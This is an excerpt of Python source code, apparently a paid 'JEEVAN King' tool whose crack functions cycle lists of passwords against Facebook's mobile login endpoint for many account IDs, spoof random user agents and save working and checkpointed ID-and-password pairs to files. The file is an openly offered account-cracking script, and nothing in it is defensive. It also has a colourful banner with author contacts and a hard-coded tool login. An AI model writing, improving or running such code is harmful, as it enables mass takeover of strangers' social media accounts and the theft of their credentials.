...
while attemps < 12345677901:
    ...
    if username == 'JEEVAN' and password == 'LADO':
...
░╚════╝░╚══════╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝
   ...
   ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
   \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
   ║    Author                   • \33[1;38mJEEVAN ]\33[1;38m    ║\033[1;31m 
   ║    Facebook                 • JEEVAN King ]  ║  \033[1;97m  
   ║    Github                   • \33[1;38mJEEVAN-DONA ]  ║\33[1;34m   
   ║    Whatsapp                 • 9817****** ] ║\33[1;35m 
   ║    TOOLS                    • PAID ]        ║ \33[1;32m   
...
os.system('espeak -a 300 " Welcome,   to,  JEEVAN,  King,  Tools"')
pass
...
def menu():
    ...
    if JEEVAN in ['111']:
        ...
        os.system('xdg-open https://www.facebook.com/JEEVAN.khadka.587')
        os.system("python nono.py")
    elif JEEVAN in ['3','03']:
        result()
    elif JEEVAN in ['0']:
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJAY JEEVAN VAN Speed Up KO LAAGI')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[JEEVANM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[JEEVAN-Cp] {idf} • {pw}')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[JEEVAN-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•JEEVAN-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                os.system('espeak -a 300 " Ok,  JEEVAN,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
